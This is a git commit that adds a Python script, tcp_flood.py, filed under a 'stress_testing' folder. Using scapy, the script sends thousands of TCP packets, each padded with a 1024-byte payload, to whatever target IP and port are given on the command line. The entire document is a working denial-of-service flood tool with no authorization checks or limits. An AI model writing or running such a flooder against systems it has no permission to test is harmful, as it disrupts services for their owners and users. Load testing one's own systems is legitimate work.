a0d1fcc6e0667a268dd164f737f43f55b5441ba3
Jean Andrew Fuentes <jeanandrewfuentes@gmail.com>
2023-04-25 10:28:24 +0800

    Tcp flood

---
+++ stress_testing/tcp_flood.py
@@ -0,0 +1,19 @@
+from scapy.all import *
+import sys
+
+def main(target_ip, target_port, rounds=10_000):
+    print(f"Target IP: {target_ip}")
+    print(f"Target Port: {target_port}")
+    print(f"Rounds: {rounds}")
+    # Define the payload to send in the packets
+    payload = "A" * 1024
+
+    # Create a loop to send a large number of packets to the target
+    for i in range(rounds):
+        packet = IP(dst=target_ip)/TCP(dport=target_port)/payload
+        send(packet, verbose=False)
+
+if __name__ == "__main__":
+    target_ip = sys.argv[1]
+    target_port = sys.argv[2]
+    main(target_ip=target_ip, target_port=target_port)
